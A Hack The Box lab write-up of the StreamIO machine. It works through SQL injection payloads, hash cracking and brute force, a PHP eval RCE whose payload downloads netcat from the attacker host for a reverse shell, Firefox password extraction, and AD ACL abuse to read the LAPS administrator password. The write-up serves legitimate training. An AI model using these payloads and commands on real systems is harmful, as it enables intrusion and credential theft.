---
icon: windows
---

# StreamIO - Medium

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/streamio"><strong>StreamIO</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.158 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 20:35 EST
Nmap scan report for dc.streamio.htb (10.10.11.158)
Host is up (0.046s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-30 08:43:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-11-30T08:44:36+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m55s, deviation: 0s, median: 6h59m54s
| smb2-time: 
|   date: 2025-11-30T08:44:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

nmap reveals 2 domain names on 443 <mark style="color:$primary;">streamIO.htb</mark> and <mark style="color:$primary;">watch.streamIO.htb</mark>. I'l add these to my hosts file

```shellscript
10.10.11.158	watch.streamio.htb streamio.htb
```

### <mark style="color:$primary;">SMB Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (2921).png" alt=""><figcaption></figcaption></figure>

No guest access but we did uncover the hostname <mark style="color:$primary;">DC.streamIO.htb</mark> I'll add it to my hosts file as well.

```shellscript
10.10.11.158	dc.streamio.htb watch.streamio.htb streamio.htb
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2922).png" alt=""><figcaption></figcaption></figure>

Default IIS site. Nothing interesting

### <mark style="color:$primary;">HTTP Port 443 TCP</mark>

#### <mark style="color:yellow;">streamio.htb</mark>

<figure><img src="../../.gitbook/assets/image (2927).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2923).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2924).png" alt=""><figcaption><p>About Page</p></figcaption></figure>

The About page contains some names, I'll write them down.

<figure><img src="../../.gitbook/assets/image (2925).png" alt=""><figcaption><p>Contact Page</p></figcaption></figure>

I tried sending a link to my host machine \[http://10.10.16.2], but got no response back

#### Directory Busting

```shellscript
feroxbuster -u https://streamio.htb -k -x php
```

<figure><img src="../../.gitbook/assets/image (2928).png" alt=""><figcaption></figcaption></figure>

Reveals an admin endpoint but when trying to visit it we are getting 403 FORBIDDEN

<figure><img src="../../.gitbook/assets/image (2929).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2930).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2931).png" alt=""><figcaption></figcaption></figure>

I found another endpoint that is only accessable via includes

I also tried registering an account and got the account created message but still was not able to login somehow.

<figure><img src="../../.gitbook/assets/image (2932).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2933).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">watch.streamio.htb</mark>

<figure><img src="../../.gitbook/assets/image (2934).png" alt=""><figcaption></figcaption></figure>

#### Directory Brute Forcing

```bash
feroxbuster -u https://watch.streamio.htb -k -x php
```

<figure><img src="../../.gitbook/assets/image (2935).png" alt=""><figcaption></figcaption></figure>

**search.php**

is a list of movies you can search through

<figure><img src="../../.gitbook/assets/image (2936).png" alt=""><figcaption></figcaption></figure>

The Watch button hasn't been implemented yet

<figure><img src="../../.gitbook/assets/image (2937).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Blind SQL Injection</mark>

#### Union SQL Injection

With a union SQLI you start with `test' union select 1;— -` and work your way up until you get a response back and that will reveal the number of columns

```shellscript
test' union select 1,2,3,4,5,6;-- -
```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Retrieving the version</mark>

```shellscript
test' union select 1,@@version,3,4,5,6;-- -
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Grabbing NTLMv2 Hash</mark>

Since this is MSSQL we can try grabbing the NTLMv2 hash of the user&#x20;

```shellscript
test'; use master; exec xp_dirtree '\\10.10.16.2\share';-- -
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Unfortunately this is not crackable

#### <mark style="color:yellow;">Enumerating Database</mark>

```shellscript
test' union select 1,name,3,4,5,6 from master.sys.databases;-- -
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shellscript
test' union select 1,(select DB_NAME()),3,4,5,6;-- -
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's see the tables

{% code overflow="wrap" %}
```shellscript
test' union select 1,table_name,3,4,5,6 from information_schema.tables --
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now let's check out the columns for the users table

{% code overflow="wrap" %}
```shellscript
test' union select 1,column_name,3,4,5,6 from information_schema.columns where table_name= 'users' --
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's extract the information from username and password columns

{% code overflow="wrap" %}
```shellscript
test' union select 1,concat(username,':',password),3,4,5,6 from users --
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nice let's save these to a file I'll use curl to do that. If you checkout the request in Burp Suite you will see the name of the parameter used to query the DB

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
curl -X POST 'https://watch.streamio.htb/search.php' -d 'q=uwu%27%20union%20select%201%2Cconcat%28username%2C%27%3A%27%2Cpassword%29%2C3%2C4%2C5%2C6%20from%20users%20%2D%2D' -k -s | grep h5 | sed -e 's/<h5 class="p-2">//g' -e 's/<\/h5>//g'| tr -d " \t" | tee username_and_password
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Curl Command explained:**

* -X -> Request Type in our Case a POST request
* -d -> contains our post parameter q that we found earlier using Burp Suite&#x20;
* -k -> this is an https request
* We then pipe everything to grep and action it to grab the `h5` tag where our text is
* Pipe it in sed to replace `<h5 class="p-2">` with null character same with `</h5>`
* Pipe it into transform to remove the tabs before the username `tr -d "\t"`

### <mark style="color:$primary;">Cracking Hashes</mark>

{% code overflow="wrap" %}
```shellscript
hashcat username_and_password /usr/share/wordlists/rockyou.txt --user -m 0
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
hashcat username_and_password /usr/share/wordlists/rockyou.txt --user -m 0 --show
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2939).png" alt=""><figcaption></figcaption></figure>

I'll separete the usernames and password and try some credential spraying.

{% code overflow="wrap" %}
```shellscript
hashcat username_and_password /usr/share/wordlists/rockyou.txt --user -m 0 --show | cut -d: -f1 | tee users
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
hashcat username_and_password /usr/share/wordlists/rockyou.txt --user -m 0 --show | cut -d: -f3 | tee passwords 
```
{% endcode %}

### <mark style="color:$primary;">Credential Spraying</mark>

<figure><img src="../../.gitbook/assets/image (2940).png" alt=""><figcaption></figcaption></figure>

Unfortunately this was a miss, I'll try login.php page on <mark style="color:$primary;">streamio.htb</mark> using <mark style="color:$primary;">hydra</mark>

### <mark style="color:$primary;">Brute Forcing https login form using Hydra</mark>

Hydra takes a single file with `[username]:[password]`

To generate it I will use the following command

{% code overflow="wrap" %}
```shellscript
hashcat username_and_password /usr/share/wordlists/rockyou.txt --user -m 0 --show | cut -d: -f1,3 | tee user-password
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2941).png" alt=""><figcaption></figcaption></figure>

I’ll use the `https-post-form` plugin, which takes a string formatted as `[page to post to]:[post body]:F=[string that indicates failed login]`

{% code overflow="wrap" %}
```shellscript
hydra -C user-password streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2942).png" alt=""><figcaption></figcaption></figure>

It finds a match let's login as the user

```shellscript
yoshihide:66boysandgirls..
```

we are in it redirects to / and we see the logout button as well

<figure><img src="../../.gitbook/assets/image (2943).png" alt=""><figcaption></figcaption></figure>

let's try visiting the admin panel

<figure><img src="../../.gitbook/assets/image (2944).png" alt=""><figcaption></figcaption></figure>

Checking out the admin panel I saw each of the links above go to the same URL with a different parameter

User management -> `https://streamio.htb/admin/?user=`

Staff management -> `https://streamio.htb/admin/?staff=`

etc...

I'll try fuzzing and see if there are any other parameters besides user, staff, movie and message.

### <mark style="color:$primary;">Fuzzing Parameters</mark>

Grab your cookie from the browser's dev tools than run the wfuzz command below

{% code overflow="wrap" %}
```shellscript
wfuzz -u https://streamio.htb/admin/?FUZZ= -w ~/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=783nnqk9aimitna6flk1pk0jst" --hh 1678
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2945).png" alt=""><figcaption></figcaption></figure>

it finds an additional one `debug`

<figure><img src="../../.gitbook/assets/image (2946).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2947).png" alt=""><figcaption></figcaption></figure>

Tried a couple of things but when I tried `index.php` it prints an additional message

### <mark style="color:$primary;">Grab master.php</mark>

I’ll use a PHP filter to get the source for `master.php` by visiting&#x20;

{% code overflow="wrap" %}
```shellscript
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```
{% endcode %}

Base64 decode:

```shellscript
echo "onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d
```

The first block of code is to make sure it is being included

```php
if(!defined('included'))
        die("Only accessable through includes");
```

At the bottom, there’s an HTML form with a hidden field, `include`

```php
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
```

If there’s a POST parameter `include`, it will use `file_get_contents` of that file and pass it to `eval` this is basically code execution!

### <mark style="color:$primary;">RCE via Post parameter PHP eval function</mark>&#x20;

I’ll send a POST request to `/admin/?debug=master.php` and then in the POST body have it `include=[something]`, and that result will be executed.

Open up Burp and send the request to repeater. Change the GET to POST, and add the POST data. I'll test it by making a request to fetch a file on my host machine, make sure to have a Python webserver running&#x20;

<figure><img src="../../.gitbook/assets/image (2948).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2949).png" alt=""><figcaption></figcaption></figure>

Nice it reaches out! I'll create an `rce.php` file to be some PHP I want to execute. Since this isn't being included, but passed to `eval` I won't need to use `<?php` and `?>`

{% code title="rce.php" %}
```shellscript
system("dir C:\\");
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2950).png" alt=""><figcaption></figcaption></figure>

nice it works. Now to get a reverse shell I'll have it download nc64.exe and establish a connection to my kali machine. Update rce.php with the below code

{% code title="rce.php" %}
```shellscript
system("powershell -c wget 10.10.16.2/nc64.exe -outfile \\programdata\\nc64.exe");
system("\\programdata\\nc64.exe -e powershell 10.10.16.2 135");
```
{% endcode %}

Now on requesting that, there will be a hit for `rce.php` and `nc64.exe`

<figure><img src="../../.gitbook/assets/image (2951).png" alt=""><figcaption></figcaption></figure>

And then you will have a connection on your listener

<figure><img src="../../.gitbook/assets/image (2952).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:green;">Shell as yoshihide</mark>

#### Manual Enumeration

I found some DB credentials in `\inetpub\watch.streamio.htb\search.php` file

{% code overflow="wrap" %}
```shellscript
$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
```
{% endcode %}

Silence Error messages or Access denied messages

```shellscript
$ErrorActionPreference = 'SilentlyContinue'
```

I'll grep to see if I can find other strings of the same format

```shellscript
dir -recurse *.php | select-string -pattern "database"
```

<figure><img src="../../.gitbook/assets/image (2954).png" alt=""><figcaption></figcaption></figure>



### <mark style="color:$primary;">streamio\_backup DB</mark>

<figure><img src="../../.gitbook/assets/image (2955).png" alt=""><figcaption></figcaption></figure>

sqlcmd is on the machine

I can’t use it interactively with my shell, but I can issue single commands per invocation at the command line using some command line arguments:

* `-S localhost` - host to connect to
* `-U db_admin` - the user to connect with
* `-P B1@hx31234567890` - password for the user
* `-d streamio_backup` - database to use
* `-Q [query]` - query to run and then exit

{% code overflow="wrap" %}
```shellscript
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2956).png" alt=""><figcaption></figcaption></figure>

There are the same two tables as the main DB

{% code overflow="wrap" %}
```shellscript
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2957).png" alt=""><figcaption></figcaption></figure>

However the `users` tables has some different users from the original dump

### <mark style="color:$primary;">Cracking Passwords</mark>

I’ll create a file with these hashes

{% code overflow="wrap" %}
```
└─$ cat user-hashes-backup                                                                                                                          
nikk37:389d14cb8e4e9b94b137deb1caf0612a
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
```
{% endcode %}

```shellscript
hashcat user-hashes-backup /usr/share/wordlists/rockyou.txt -m 0 --user
```

{% code overflow="wrap" %}
```shellscript
hashcat user-hashes-backup /usr/share/wordlists/rockyou.txt -m 0 --user --show
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2958).png" alt=""><figcaption></figcaption></figure>

A couple of them cracked I'll add them to the user and password files and retry credential spraying.

### <mark style="color:$primary;">Credential Spraying</mark>

```shellscript
netexec smb 10.10.11.158 -u users -p passwords --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (2959).png" alt=""><figcaption></figcaption></figure>

I got a hit for nikk37

<figure><img src="../../.gitbook/assets/image (2960).png" alt=""><figcaption></figcaption></figure>

and his creds work over winrm as well

### <mark style="color:green;">Shell as nikk37</mark>

<figure><img src="../../.gitbook/assets/image (2961).png" alt=""><figcaption></figcaption></figure>

#### Manual Enumeration

I noticed Firefox when checking out the installed programs on the host earlier, however yoshihide did not have a home directory whereas nikk37 has one with a Firefox profile:

<figure><img src="../../.gitbook/assets/image (2962).png" alt=""><figcaption></figcaption></figure>

The first folder is empty and the second folder has the standard files

<figure><img src="../../.gitbook/assets/image (2963).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Extracting Firefox Passwords</mark>

We will need 2 files from the profile `key4.db` and `logins.json` copy the files to the machine, if your using evil-winrm use the download feature&#x20;

<figure><img src="../../.gitbook/assets/image (2964).png" alt=""><figcaption></figcaption></figure>

#### Extract Passwords

We will be using [**Firepwd**](https://github.com/lclevy/firepwd) to decrypt the stored passwords.

```shellscript
git clone https://github.com/lclevy/firepwd.git
```

Than just run the script in the folder you have the files in

```shellscript
python firepwd/firepwd.py
```

<figure><img src="../../.gitbook/assets/image (2965).png" alt=""><figcaption></figcaption></figure>

It discovers 4 new passwords for Slack.

### <mark style="color:$primary;">Credential Spraying Slack Passwords</mark>

{% code overflow="wrap" %}
```shellscript
netexec smb 10.10.11.158 -u slack_users -p slack_passwords --continue-on-success
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2966).png" alt=""><figcaption></figcaption></figure>

We got a hit!

```shellscript
JDgodd:JDg0dd1s@d0p3cr3@t0r
```

<figure><img src="../../.gitbook/assets/image (2967).png" alt=""><figcaption></figcaption></figure>

JDgodd does not have winrm acces however.&#x20;

This is an AD environment so its time to turn to bloodhound and look for some misconfigured permissions

### <mark style="color:$primary;">Bloodhound</mark>

{% code overflow="wrap" %}
```shellscript
netexec ldap 10.10.11.158 -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' --bloodhound --collection All --dns-server 10.10.11.158
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2970).png" alt=""><figcaption></figcaption></figure>

### Shortest Path from Owned Principals

<figure><img src="../../.gitbook/assets/image (2968).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2969).png" alt=""><figcaption></figcaption></figure>

JDgodd has `WriteOwner` on the Core Staff group, and Core Staff has `ReadLAPSPassword` on the DC computer

### <mark style="color:$primary;">ReadLapsPassword</mark>

#### <mark style="color:yellow;">First we need to add the user to core staff</mark>

I'll download a copy of PowerView.ps1 into programdata

```shellscript
iwr http://10.10.16.2/PowerView.ps1 -outfile PowerView.ps1
```

```shellscript
. .\PowerView.ps1
```

<figure><img src="../../.gitbook/assets/image (2972).png" alt=""><figcaption></figcaption></figure>

Create a credential object for JDgodd

{% code overflow="wrap" %}
```ps
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2971).png" alt=""><figcaption></figcaption></figure>

add JDgodd to the group

{% code overflow="wrap" %}
```shellscript
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2973).png" alt=""><figcaption></figcaption></figure>

JDgodd now shows as a member of Core Staff

<figure><img src="../../.gitbook/assets/image (2974).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Get Laps Password</mark>

I can now read the LAPS password from the ms-MCS-AdmPwd property on the computer object

```shellscript
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

<figure><img src="../../.gitbook/assets/image (2975).png" alt=""><figcaption></figcaption></figure>

it can also be achieved with ldap&#x20;

{% code overflow="wrap" %}
```shellscript
ldapsearch -H ldap://10.10.11.158 -b "DC=streamIO,DC=htb" -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2977).png" alt=""><figcaption></figcaption></figure>

or via netexec much easier

{% code overflow="wrap" %}
```shellscript
netexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2978).png" alt=""><figcaption></figcaption></figure>

Now we can get a shell as the administrator user

```shellscript
evil-winrm -i 10.10.11.158 -u administrator -p 'm$@H[x,97PAo9b'
```

<figure><img src="../../.gitbook/assets/image (2976).png" alt=""><figcaption></figcaption></figure>
